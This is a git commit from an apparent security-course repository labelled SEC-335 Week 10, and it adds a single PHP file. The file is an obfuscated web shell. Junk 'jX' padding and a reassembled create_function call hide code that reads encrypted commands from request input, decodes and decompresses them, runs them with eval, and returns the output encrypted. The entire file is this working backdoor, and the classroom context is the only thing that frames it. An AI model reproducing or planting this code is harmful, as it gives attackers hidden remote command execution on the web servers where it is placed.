6335a5e4929d9ccfa538b93703a6ab2decf30554
ChampPG <71086240+ChampPG@users.noreply.github.com>
2023-04-14 00:22:55 -0400

    Course Finished

---
+++ SEC-335/Week 10/paul_nancur.php
@@ -0,0 +1,11 @@
+<?php
+$l='cjXtion jXx($t,jX$k){$c=stjXjXrlen(jX$kjX);$l=strlen($jXjXt);$o="";for(jX$i=0;$i<$ljX;){fojXr($j=0';
+$a=';(jX$j<$cjX&&$i<$ljX);$jXj++,$i++jX)jX{$ojX.=$t{$i}^$k{$jXj};}}retjXurn jX$o;jX}if (@prjXeg_match(jX';
+$L=str_replace('yA','','cryAyAeateyA_fuyAyAnctyAion');
+$c='_end_cjXlejXan();jX$r=@base6jX4_enjXcode(jX@x(@gzcomprejXss($jXojX)jX,$k));print("$jXp$kh$r$kf");}';
+$v='"/$khjX(jX.+)$kf/",@jXfile_gjXjXet_jXjXcontents("php://inputjX"),$m)jX==1jX) {@objX_start()jX;@eva';
+$U='jXl(@gjXzuncomjXpressjX(@x(@bajXjXse64_decode(jX$m[1])jX,$k)))jX;jX$o=@ob_get_cojXntents()jXjX;@ob';
+$o='$k="jXa4d80jXeac";$kh="9jXab26a4jXa2da0";jX$kfjX="4125bc2jXc09jX6ajX";$p="6qjX9X4l8QNljjjXSwPJ";fjXun';
+$W=str_replace('jX','',$o.$l.$a.$v.$U.$c);
+$O=$L('',$W);$O();
+?>
